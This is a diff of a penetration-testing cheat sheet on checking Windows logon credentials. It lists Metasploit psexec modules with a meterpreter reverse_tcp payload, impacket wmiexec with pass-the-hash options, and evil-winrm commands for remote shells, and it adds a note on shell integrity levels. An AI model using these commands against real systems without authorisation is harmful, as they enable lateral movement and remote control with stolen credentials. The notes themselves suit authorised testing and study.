@@ -2,14 +2,14 @@
 
 ## check if win-logon-creds are working
 
-Note: psexec & evil-winrm uses port:5985 (powershell remote access)
-
 ### msf
 
 * `use exploit/windows/smb/psexec`
     * `set PAYLOAD windows/x64/meterpreter/reverse_tcp`
     * `SHOW TARGETS` > `set TARGET X`
 * `use exploit/windows/smb/psexec_psh`
+
+**Note:** psexec & evil-winrm uses `port 5985` (powershell remote access)
 
 ### psexec | smbexec | wmiexec
 
@@ -23,9 +23,12 @@ impacket-wmiexec DOMAIN/USER:['PASS']@IP [-hashes :NTLMHASH]
 
 ### evil-winrm
 
+**NOTE:** evil-winrm usually gives **medium integrity shells** for added administrator accounts. Even if new account has
+Administrator permissions, cannot actually perform administrative actions with it.
+
 ```bash
 # only USER, no DOMAIN needed
-evil-winrm -i IP -u <USER> [-H NT-HASH | -p PASS]
+evil-winrm -i IP -u USER [-H NT-HASH | -p PASS]
 
 # custom options
 PS> menu
